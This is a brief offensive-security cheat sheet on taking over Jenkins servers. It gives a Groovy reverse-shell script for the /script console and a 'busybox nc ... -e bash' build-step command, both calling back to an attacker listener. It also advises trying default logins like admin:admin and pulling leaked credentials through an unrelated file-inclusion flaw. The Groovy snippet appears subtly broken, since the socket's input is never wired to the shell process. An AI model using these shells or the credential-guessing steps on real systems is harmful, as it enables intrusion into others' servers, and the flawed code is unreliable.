# Jenkins Script Console RCE

Any Jenkins login with access to `/script` (the Groovy console) is a direct root/SYSTEM shell on the Jenkins host — this is by design, not a bug, so any leaked Jenkins credential is critical.

```groovy
def sock = new Socket("<LHOST>", <LPORT>);
sock.getInputStream().withCloseable { ins -> sock.getOutputStream().withCloseable { outs ->
  new ProcessBuilder("cmd.exe").redirectErrorStream(true).start().getInputStream().withCloseable { ps ->
    ps.transferTo(outs) } } }
```
Paste into `/script`, hit Run, catch the connection with a listener. Jenkins credentials often leak via an exposed config/`.ini` file reachable through an unrelated LFI elsewhere on the same host. Always try `admin:admin` (and other defaults) first — a surprising number of Jenkins instances are never past their first-run setup; from there, an "Execute shell" freestyle build step is an even simpler RCE than the script console:
```bash
# build step command, in any freestyle job
busybox nc <LHOST> <LPORT> -e bash
```
